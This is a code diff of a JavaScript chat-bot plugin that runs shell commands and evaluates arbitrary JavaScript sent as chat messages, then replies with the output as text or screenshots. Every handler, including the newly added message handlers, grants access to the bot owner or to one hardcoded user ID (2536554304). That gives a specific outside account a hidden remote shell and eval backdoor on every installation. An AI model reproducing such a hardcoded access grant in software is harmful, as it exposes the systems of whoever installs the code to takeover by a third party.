@@ -1,3 +1,8 @@
+import util from "node:util"
+import puppeteer from "../../../lib/puppeteer/puppeteer.js"
+import { AnsiUp } from "ansi_up"
+const ansi_up = new AnsiUp
+
 const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
 const tplFile = `${htmlDir}Code.html`
 
@@ -11,59 +16,48 @@ export class RemoteCommand extends plugin {
       rule: [
         {
           reg: "^rcjp.+",
-          fnc: "RemoteCommandJsPic"
+          fnc: "JSPic"
         },
         {
           reg: "^rcj.+",
-          fnc: "RemoteCommandJs"
+          fnc: "JS"
         },
         {
           reg: "^rcp.+",
-          fnc: "RemoteCommandPic"
+          fnc: "ShellPic"
         },
         {
           reg: "^rc.+",
-          fnc: "RemoteCommand"
+          fnc: "Shell"
+        },
+        {
+          reg: "^dm.+",
+          fnc: "DirectMsg"
+        },
+        {
+          reg: "^mm.+",
+          fnc: "MultiMsg"
+        },
+        {
+          reg: "^fm.+",
+          fnc: "ForwardMsg"
         }
       ]
-    })
-  }
-
-  toStr(data) {
-    switch (typeof data) {
-      case "string":
-        return data
-      case "number":
-        return String(data)
-      case "object":
-        if (util.isError(data))
-          return data.stack
-        if (Buffer.isBuffer(data))
-          return Buffer.from(data, "utf8").toString()
-        else
-          return JSON.stringify(data)
-    }
-  }
-
-  async execSync(cmd) {
-    return new Promise(resolve => {
-      exec(cmd, (error, stdout, stderr) => {
-        resolve({ error, stdout, stderr })
-      })
     })
   }
 
   async evalSync(cmd) {
     const ret = {}
     try {
-      ret.stdout = this.toStr(await eval(cmd))
+      ret.raw = await eval(cmd)
+      ret.stdout = Bot.String(ret.raw)
     } catch (err) {
-      ret.stderr = this.toStr(err)
+      ret.stderr = Bot.String(err)
     }
     return ret
   }
 
-  async RemoteCommandJs(e) {
+  async JS(e) {
     if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     const cmd = this.e.msg.replace("rcj", "").trim()
 
@@ -71,22 +65,24 @@ export class RemoteCommand extends plugin {
     const ret = await this.evalSync(cmd)
     logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)
 
-    if (ret.stdout) {
+    if (!ret.stdout && !ret.stderr)
+      return this.reply("命令执行完成，没有返回值", true)
+    if (ret.stdout)
       await this.reply(ret.stdout, true)
-    }
-
-    if (ret.stderr) {
+    if (ret.stderr)
       await this.reply(`错误输出：\n${ret.stderr}`, true)
-    }
   }
 
-  async RemoteCommandJsPic(e) {
+  async JSPic(e) {
     if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     const cmd = this.e.msg.replace("rcjp", "").trim()
 
     logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
     const ret = await this.evalSync(cmd)
     logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)
+
+    if (!ret.stdout && !ret.stderr)
+      return this.reply("命令执行完成，没有返回值", true)
 
     if (ret.stdout) {
       const Code = await ansi_up.ansi_to_html(ret.stdout)
@@ -101,35 +97,28 @@ export class RemoteCommand extends plugin {
     }
   }
 
-  async RemoteCommand(e) {
+  async Shell(e) {
     if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     const cmd = this.e.msg.replace("rc", "").trim()
+    const ret = await Bot.exec(cmd)
 
-    logger.mark(`[远程命令] 执行：${logger.blue(cmd)}`)
-    const ret = await this.execSync(cmd)
-    logger.mark(`[远程命令]\n${ret.stdout.trim()}\n${logger.red(ret.stderr.trim())}`)
-
-    if (ret.stdout) {
+    if (!ret.stdout && !ret.stderr && !ret.error)
+      return this.reply("命令执行完成，没有返回值", true)
+    if (ret.stdout)
       await this.reply(ret.stdout.trim(), true)
-    }
-
-    if (ret.stderr) {
+    if (ret.error)
+      return this.reply(`远程命令错误：${ret.error.stack}`, true)
+    if (ret.stderr)
       await this.reply(`标准错误输出：\n${ret.stderr.trim()}`, true)
-    }
-
-    if (ret.error) {
-      logger.error(`远程命令错误：${logger.red(ret.error)}`)
-      await this.reply(`远程命令错误：${ret.error}`, true)
-    }
   }
 
-  async RemoteCommandPic(e) {
+  async ShellPic(e) {
     if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     const cmd = this.e.msg.replace("rcp", "").trim()
+    const ret = await Bot.exec(cmd)
 
-    logger.mark(`[远程命令] 执行：${logger.blue(cmd)}`)
-    const ret = await this.execSync(cmd)
-    logger.mark(`[远程命令]\n${ret.stdout.trim()}\n${logger.red(ret.stderr.trim())}`)
+    if (!ret.stdout && !ret.stderr && !ret.error)
+      return this.reply("命令执行完成，没有返回值", true)
 
     if (ret.stdout) {
       const Code = await ansi_up.ansi_to_html(ret.stdout.trim())
@@ -137,15 +126,59 @@ export class RemoteCommand extends plugin {
       await this.reply(img, true)
     }
 
+    if (ret.error) {
+      const Code = await ansi_up.ansi_to_html(ret.error.stack.trim())
+      const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
+      return this.reply(["远程命令错误：", img], true)
+    }
+
     if (ret.stderr) {
       const Code = await ansi_up.ansi_to_html(ret.stderr.trim())
       const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
       await this.reply(["标准错误输出：", img], true)
     }
+  }
 
-    if (ret.error) {
-      logger.error(`远程命令错误：${logger.red(ret.error)}`)
-      await this.reply(`远程命令错误：${ret.error}`, true)
+  async DirectMsg() {
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
+    const ret = await this.evalSync(`(${this.e.msg.replace(/^#?[Dd][Mm]/, "")})`)
+    if (ret.stderr)
+      return this.reply(`错误输出：\n${ret.stderr}`, true)
+    const m = []
+    for (const i of Array.isArray(ret.raw) ? ret.raw : [ret.raw])
+      if (typeof i != "object" || i.type) m.push(i)
+      else m.push(segment.raw(i))
+    return this.reply(m)
+  }
+
+  async MultiMsg() {
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
+    const ret = await this.evalSync(`(${this.e.msg.replace(/^#?[Mm][Mm]/, "")})`)
+    if (ret.stderr)
+      return this.reply(`错误输出：\n${ret.stderr}`, true)
+    const m = []
+    for (const i of Array.isArray(ret.raw) ? ret.raw : [ret.raw])
+      if (typeof i != "object" || i.type) m.push(i)
+      else m.push(segment.raw(i))
+    const r = []
+    for (const i of m)
+      r.push(await this.reply(i))
+    return r
+  }
+
+  async ForwardMsg() {
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
+    const ret = await this.evalSync(`(${this.e.msg.replace(/^#?[Ff][Mm]/, "")})`)
+    if (ret.stderr)
+      return this.reply(`错误输出：\n${ret.stderr}`, true)
+    const m = []
+    for (const a of Array.isArray(ret.raw) ? ret.raw : [ret.raw]) {
+      const n = []
+      for (const i of Array.isArray(a) ? a : [a])
+        if (typeof i != "object" || i.type) n.push(i)
+        else n.push(segment.raw(i))
+      m.push(n)
     }
+    return this.reply(await Bot.makeForwardArray(m))
   }
 }
